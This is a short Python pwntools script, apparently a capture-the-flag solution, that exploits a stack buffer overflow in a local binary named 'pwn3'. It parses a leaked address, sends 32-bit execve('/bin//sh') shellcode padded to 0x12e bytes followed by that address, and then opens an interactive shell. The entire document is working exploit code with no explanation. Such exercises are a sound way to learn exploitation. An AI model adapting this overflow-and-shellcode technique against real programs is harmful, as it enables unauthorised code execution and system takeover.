from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
target=process('./pwn3', stdin=PIPE, stdout=PIPE)

target.recvuntil("journey ")

leak = target.recvline()

shellcodeAdr = int(leak.strip(b"!\n"), 16)

print("shellcodeAdr:"+hex(shellcodeAdr))

payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload += b"0"*(0x12e - len(payload))

payload += p32(shellcodeAdr)

target.sendline(payload)

target.interactive()